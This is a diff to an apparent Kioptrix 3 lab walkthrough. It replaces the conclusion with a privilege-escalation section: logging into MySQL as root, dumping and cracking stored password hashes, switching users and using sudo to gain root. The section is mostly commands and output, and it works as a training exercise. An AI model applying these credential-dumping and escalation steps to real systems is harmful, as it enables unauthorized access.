@@ -111,7 +111,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 318.64 seconds
 ```
 
-next, nikto.
+Next, Nikto.
 
 ---
 
@@ -145,8 +145,6 @@ Nikto identified the presence of phpMyAdmin, directory indexing, outdated Apache
 + [001384] /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP Easter Egg.
 + [001795] /phpmyadmin/changelog.php: phpMyAdmin exposed.
 ```
-
-The web application appears to be running a vulnerable LotusCMS instance and supporting mapped directories that deserve further investigation.
 
 ---
 
@@ -336,6 +334,101 @@ These credentials may allow database access or privilege escalation.
 
 ---
 
-## Conclusion
+### MySQL
 
-The target is vulnerable to LotusCMS PHP code injection, enabling remote shell access as `www-data`. Further privilege escalation can be pursued using the discovered MySQL credentials or by investigating the `sudo ht` policy.
+Let's logging in.
+
+```
+mysql -uroot -pfuckeyou
+```
+
+I found hash password from `dev_accounts` in `gallery`.
+
+```
+mysql> use gallery; 
+use gallery; 
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++----------------------+
+| Tables_in_gallery    |
++----------------------+
+| dev_accounts         | 
+| gallarific_comments  | 
+| gallarific_galleries | 
+| gallarific_photos    | 
+| gallarific_settings  | 
+| gallarific_stats     | 
+| gallarific_users     | 
++----------------------+
+7 rows in set (0.00 sec)
+
+mysql> select * from dev_accounts;
+select * from dev_accounts;
++----+------------+----------------------------------+
+| id | username   | password                         |
++----+------------+----------------------------------+
+|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
+|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
++----+------------+----------------------------------+
+2 rows in set (0.10 sec)
+```
+
+Decode it in `https://crackstation.net/`.
+
+```
+username : password : decoded password
+dreg : 0d3eccfb887aabd50f243b3f155c0f85 : Mast3r
+loneferret : 5badcaf789d3d1d09794d8f021f40f0e : starwars
+```
+
+Log in to `loneferret`.
+
+```
+su loneferret
+starwars
+```
+
+Success.
+
+```
+www-data@Kioptrix3:/$ su loneferret
+su loneferret
+Password: starwars
+
+loneferret@Kioptrix3:/$
+```
+
+Verify sudo permission.
+
+```
+sudo -l
+```
+
+That's great, i have all permission.
+
+```
+loneferret@Kioptrix3:/$ sudo -l
+sudo -l
+[sudo] password for loneferret: starwars
+
+User loneferret may run the following commands on this host:
+    (ALL) ALL
+```
+
+Try to change to root.
+
+```
+sudo su -
+```
+
+Now i'm root.
+
+```
+loneferret@Kioptrix3:/$ sudo su -
+sudo su -
+root@Kioptrix3:~#
+```
